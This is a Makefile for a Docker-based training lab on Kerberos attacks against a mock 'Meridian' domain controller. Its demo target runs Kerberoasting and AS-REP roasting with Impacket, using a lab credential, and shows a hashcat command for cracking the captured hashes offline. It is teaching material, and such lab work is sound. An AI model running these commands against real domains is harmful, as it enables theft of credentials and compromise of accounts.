# Module 03 — Kerberos Attacks lab.
# Standard targets: up / down / reset / demo / shell
.PHONY: up down reset demo shell

up:         ## Build and start the DC + attacker container
	docker compose up -d --build

down:       ## Stop and remove containers
	docker compose down

reset:      ## Tear down completely
	docker compose down --rmi local --volumes --remove-orphans

shell:      ## Open a shell in the attacker container
	docker compose exec attacker bash

demo:       ## Run Kerberoast + AS-REP roast demo against the Meridian DC
	@echo "=== Waiting for DC... ==="
	docker compose exec attacker sh -c \
	    'until python3 -c "import socket; socket.create_connection((\"dc01.meridian.local\", 88), 3)" 2>/dev/null; do sleep 3; done; echo "KDC reachable."'
	@echo ""
	@echo "=== 1. Kerberoasting — requesting TGS tickets for all SPNs ==="
	docker compose exec attacker \
	    GetUserSPNs.py MERIDIAN.LOCAL/jsmith:'Welcome1!' \
	    -dc-ip 10.10.0.10 -request 2>/dev/null || \
	    echo "[note] Samba4 Kerberoast may require additional KDC config — see data/hashes.txt for sample hashes"
	@echo ""
	@echo "=== 2. AS-REP Roasting — no password required ==="
	docker compose exec attacker \
	    GetNPUsers.py MERIDIAN.LOCAL/ \
	    -dc-ip 10.10.0.10 \
	    -no-pass \
	    -usersfile /data/userlist.txt 2>/dev/null | grep -v "^Impacket\|^$\|\[-\]" || \
	    echo "[note] Try: GetNPUsers.py MERIDIAN.LOCAL/ -dc-ip 10.10.0.10 -no-pass -usersfile /data/userlist.txt"
	@echo ""
	@echo "=== 3. Sample hashes for offline cracking practice ==="
	@echo "   cat data/hashes.txt"
	@echo "   hashcat -m 13100 data/hashes.txt /usr/share/wordlists/rockyou.txt --force"
	@echo ""
	@echo "=== Demo complete. Run 'make shell' to explore interactively. ==="
